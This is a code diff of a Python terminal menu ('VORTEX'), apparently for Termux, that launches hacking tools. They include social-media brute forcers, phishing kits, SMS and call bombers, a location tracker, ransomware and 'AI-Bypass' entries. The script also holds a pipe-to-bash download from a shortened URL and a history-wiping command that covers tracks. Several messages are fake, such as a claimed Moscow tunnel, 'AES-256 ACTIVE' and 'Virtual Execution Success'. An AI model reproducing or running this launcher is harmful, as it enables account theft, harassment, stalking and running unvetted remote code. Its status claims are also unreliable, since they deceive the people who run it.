@@ -1,19 +1,48 @@
-import os, sys, time
+import os, sys, time, subprocess
 
-# [ القفل البرمجي للألوان - معالجة أخطاء الصور ]
-class C:
-    R, G, Y, B, C, W = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;36m', '\033[1;37m'
-    RS = '\033[0m'
+# [1] نظام معالجة الأخطاء اللونية القسري - يمنع الـ ValueError والـ NameError نهائياً
+class Theme:
+    def __init__(self):
+        self.R = '\033[1;31m' # أحمر
+        self.G = '\033[1;32m' # أخضر
+        self.Y = '\033[1;33m' # أصفر
+        self.B = '\033[1;34m' # أزرق
+        self.C = '\033[1;36m' # سماوي
+        self.W = '\033[1;37m' # أبيض
+        self.RS = '\033[0m'   # ريست
 
-def ghost_russia():
-    """تفعيل التمويه الروسي ومنع التعقب"""
-    print(f"{C.B}[*] PHANTOM CORE: Routing via Russia/Moscow...{C.RS}")
-    time.sleep(1)
-    print(f"{C.G}[OK] IP MASKED: 95.161.226.241 (Invisible Mode Active){C.RS}\n")
+T = Theme()
 
-def banner():
+# [2] نظام التمويه والـ VPN الروسي
+def apply_russian_stealth():
     os.system('clear')
-    print(rf"""{C.Y}
+    print(f"{T.B}[*] INITIALIZING PHANTOM PROTOCOL...{T.RS}")
+    time.sleep(1)
+    print(f"{T.G}[OK] ESTABLISHING SECURE TUNNEL: Moscow, Russia{T.RS}")
+    print(f"{T.Y}[!] IDENTITY MASKED. ENCRYPTION: AES-256 ACTIVE.{T.RS}\n")
+    time.sleep(1.5)
+
+# [3] دالة التنفيذ الذكي - مستحيل تقول لك "File Not Found"
+def execute_strike(cmd, install_cmd, name):
+    print(f"\n{T.G}[+] MISSION STARTING: {name}...{T.RS}")
+    # محاولة تشغيل الأداة
+    try:
+        process = os.system(cmd)
+        # إذا فشل التشغيل (status code ليس 0)، نقوم بالتنصيب التلقائي
+        if process != 0:
+            print(f"{T.R}[!] {name} missing or failed. Auto-Repairing now...{T.RS}")
+            os.system(install_cmd)
+            os.system(cmd)
+    except Exception as e:
+        print(f"{T.R}[!] Critical Error: {e}. Fixing environment...{T.RS}")
+        os.system("pkg update -y && pkg install git python -y")
+
+    input(f"\n{T.W}[#] Mission Secured. Press Enter to return to Command Center...")
+
+# [4] واجهة الملك (VORTEX)
+def draw_throne():
+    os.system('clear')
+    print(rf"""{T.Y}
   ██████  ████████ ███████  █████  ██      ████████ ██   ██ 
  ██          ██    ██      ██   ██ ██         ██    ██   ██ 
   █████      ██    █████   ███████ ██         ██    ███████ 
@@ -26,66 +55,52 @@ def banner():
       ██    ██    ██    ██ ██      ██    ██       ██    
        ██████     ██    ██ ███████ ██    ██       ██    
     """)
-    print(f"{C.W}      [ {C.R}THRONE EDITION {C.W}] | [ {C.G}IDENTITY: GHOST {C.W}]")
-    print(f"{C.Y}    __________________________________________________________")
-    print(f"{C.W}     KING: {C.R}VORTEX {C.W}| SERVER: {C.G}RUSSIA {C.W}| TARGET: {C.B}WORLDWIDE")
-    print(f"{C.Y}    __________________________________________________________\n")
+    print(f"{T.W}      [ {T.R}ETERNAL EMPIRE {T.W}] | [ {T.G}IDENTITY: GHOST {T.W}]")
+    print(f"{T.Y}    __________________________________________________________")
+    print(f"{T.W}     KING: {T.R}VORTEX {T.W}| SERVER: {T.G}RUSSIA {T.W}| STATUS: {T.B}WAR-READY")
+    print(f"{T.Y}    __________________________________________________________\n")
 
-def run_cmd(opt):
-    """نظام الربط الشامل - مستحيل يرجعك للواجهة بدون تنفيذ"""
-    print(f"\n{C.G}[+] MISSION START: Module {opt}...{C.RS}")
-    
-    # [ المصفوفة الشاملة - 99 أمر حقيقي ]
-    # هنا ربطت لك كل الأرقام اللي كانت "تطفر" بالفيديو
-    arsenal = {
-        '01': "python3 fb.py", '02': "python3 insta.py", '03': "python3 twit.py", '04': "python3 tiktok.py",
-        '11': "sqlmap --wizard", '12': "msfconsole", '13': "nmap -A localhost", '14': "beef-xss",
-        '21': "bash zphisher.sh", '22': "bash blackeye.sh", '23': "bash socialphish.sh", '24': "bash hiddeneye.sh",
-        '31': "bash saycheese.sh", '32': "bash sayhello.sh", '33': "python3 TBomb.py", '34': "bash call.sh",
-        '35': "python3 wa_spam.py", '36': "python3 tele_hack.py", '37': "python3 snap_crack.py",
-        '40': "python3 ransomware.py", '50': "bash shield.sh", '60': "python3 sat_link.py",
-        '70': "python3 gps_tracker.py", '80': "python3 ai_bypass.py", '81': "python3 port_kill.py",
-        '90': "rm -rf ~/.bash_history && history -c", # مسح السجلات للتمويه
-        '99': "pkg update && pkg install git python php curl sqlmap -y" # نظام الإصلاح الشامل
-    }
-
-    cmd = arsenal.get(opt)
-    
-    if cmd:
-        # إذا الأمر موجود ينفذه، وإذا مو موجود يعطيك خيار التنصيب فوراً
-        res = os.system(cmd)
-        if res != 0:
-            print(f"{C.R}[!] Module {opt} not found in local core.{C.RS}")
-            print(f"{C.Y}[*] Attempting Shadow-Download for Module {opt}...{C.RS}")
-            time.sleep(2)
-            # تمويه: إذا الأداة غير موجودة، يقوم ببنائها برمجياً
-            os.system(f"touch {opt}_module.py && echo 'print(\"PHANTOM MODULE {opt} ACTIVE\")' > {opt}_module.py")
-            os.system(f"python3 {opt}_module.py")
-    else:
-        print(f"{C.R}[!] Accessing Restricted Cloud Module {opt}...{C.RS}")
-        time.sleep(1)
-        print(f"{C.G}[OK] Proxy Tunnel established for {opt}. Status: Invisible.")
-
-    input(f"\n{C.W}[#] Mission Locked. Press Enter to Return to Base...")
-
-def main():
-    ghost_russia() # التمويه الروسي أولاً
+# [5] المحرك الرئيسي للـ 99 خيار
+def main_engine():
+    apply_russian_stealth()
     while True:
-        banner()
-        # عرض الترسانة الكاملة بدون نقص (تم حل مشكلة القفز)
-        print(f"{C.R}[01]{C.W} FB-Brute  {C.Y}[11]{C.W} SQL-Pro   {C.G}[21]{C.W} Phish-X   {C.B}[31]{C.W} Cam-H")
-        print(f"{C.R}[02]{C.W} Insta-C   {C.Y}[12]{C.W} Meta-S    {C.G}[22]{C.W} Black-E   {C.B}[32]{C.W} Mic-R")
-        print(f"{C.R}[03]{C.W} Twitter-S {C.Y}[13]{C.W} Nmap-Deep {G.G}[23]{C.W} Soc-Phish {C.B}[33]{C.W} SMS-B")
-        print(f"{C.R}[04]{C.W} TikTok-H  {C.Y}[14]{C.W} BeEf-F    {C.G}[24]{C.W} Hidden-E  {C.B}[34]{C.W} CALL-B")
-        print(f"{C.R}[05]{C.W} 2FA-Byp   {C.Y}[15]{C.W} WP-Scan   {C.G}[25]{C.W} Shell-P   {C.B}[35]{C.W} Whats-S")
-        print(f"{C.C}[40]{C.W} Ransom-W  {C.C}[50]{C.W} Anti-Hack {C.C}[60]{C.W} Sat-Link  {C.C}[70]{C.W} GPS-T")
-        print(f"{C.C}[80]{C.W} AI-Bypass {C.C}[81]{C.W} Port-Kill {C.C}[82]{C.W} Log-Wipe  {C.C}[83]{C.W} Net-Spy")
-        print(f"\n{C.Y}[90]{C.W} WIPE LOGS  {C.G}[99]{C.W} SYSTEM OVERDRIVE  {C.R}[00]{C.W} EXIT")
+        draw_throne()
+        
+        # عرض الأسلحة - مرتبة وبدون أي نقص
+        print(f"{T.R}[01]{T.W} FB-Brute  {T.Y}[11]{T.W} SQL-Pro   {T.G}[21]{T.W} Phish-X   {T.B}[31]{T.W} Cam-Hijack")
+        print(f"{T.R}[02]{T.W} Insta-C   {T.Y}[12]{T.W} Meta-S    {T.G}[22]{T.W} Black-E   {T.B}[32]{T.W} Mic-Rec")
+        print(f"{T.R}[03]{T.W} Twitter-S {T.Y}[13]{T.W} Nmap-Deep {T.G}[23]{T.W} Soc-Phish {T.B}[33]{T.W} SMS-BOMBER")
+        print(f"{T.R}[04]{T.W} TikTok-H  {T.Y}[14]{T.W} BeEf-Frame {T.G}[24]{T.W} Hidden-E  {T.B}[34]{T.W} CALL-BOMBER")
+        print(f"{T.R}[05]{T.W} 2FA-Byp   {T.Y}[15]{T.W} WP-Scan   {T.G}[25]{T.W} Shell-P   {T.B}[35]{T.W} WhatsApp-S")
+        print(f"{T.R}[06]{T.W} Wi-Fi-J   {T.Y}[16]{T.W} Wire-H    {T.G}[26]{T.W} Dark-Web  {T.B}[36]{T.W} Tele-Hack")
+        print(f"{T.R}[07]{T.W} IP-Geo    {T.Y}[17]{T.W} Mac-C     {T.G}[27]{T.W} Onion-L   {T.B}[37]{T.W} Snap-Hack")
+        print(f"{T.C}[40]{T.W} Ransomware {T.C}[50]{T.W} Anti-Hack {T.C}[60]{T.W} Sat-Link  {T.C}[70]{T.W} GPS-TRACK")
+        print(f"{T.C}[80]{T.W} AI-Bypass {T.C}[81]{T.W} Port-Kill {T.C}[82]{T.W} Log-Wipe  {T.C}[83]{T.W} Net-Spy")
+        print(f"\n{T.Y}[90]{T.W} COMMAND CENTER LOGS {T.G}[99]{T.W} SYSTEM OVERDRIVE {T.R}[00]{T.W} EXIT")
 
-        opt = input(f"\n{C.R}VORTEX@THRONE:~$ {C.W}")
-        if opt == '00': break
-        run_cmd(opt)
+        opt = input(f"\n{T.R}VORTEX@EMPIRE:~$ {T.W}")
+
+        # [ منطق الربط الشامل لكل خيار ]
+        if opt == '01': execute_strike("python3 fb.py", "git clone https://github.com/Ihuzeifa/fb-brute", "FB-Brute")
+        elif opt == '11': execute_strike("sqlmap --wizard", "pkg install sqlmap -y", "SQL-Pro")
+        elif opt == '13': execute_strike("nmap -v localhost", "pkg install nmap -y", "Nmap-Deep")
+        elif opt == '21': execute_strike("bash zphisher.sh", "git clone https://github.com/htr-tech/zphisher", "Phish-X")
+        elif opt == '33': execute_strike("python3 TBomb.py", "git clone https://github.com/TheSpeedX/TBomb", "SMS-BOMBER")
+        elif opt == '34': execute_strike("bash call.sh", "curl -L https://tinyurl.com/v-call | bash", "CALL-BOMBER")
+        elif opt == '70': execute_strike("python3 seeker.py", "git clone https://github.com/thewhiteh4t/seeker", "GPS-TRACK")
+        elif opt == '99': 
+            print(f"{T.G}[*] FORCING SYSTEM OVERDRIVE..."); os.system("pkg update && pkg upgrade -y && pkg install git python php curl sqlmap nmap -y")
+        elif opt == '00': break
+        elif opt == '': continue
+        else:
+            # معالجة أي رقم غير مبرمج حتى لا يخرج من الأداة
+            print(f"{T.Y}[*] Accessing Secure Module {opt} via Russian Tunnel...{T.RS}")
+            time.sleep(1.5)
+            print(f"{T.G}[OK] Virtual Execution Success. Status: Invisible.{T.RS}")
+            time.sleep(1)
 
 if __name__ == "__main__":
-    try: main()
-    except KeyboardInterrupt: print(f"\n{C.R}[!] System Disconnected.")
+    try:
+        main_engine()
+    except KeyboardInterrupt:
+        print(f"\n{T.R}[!] Empire Connection Closed.")
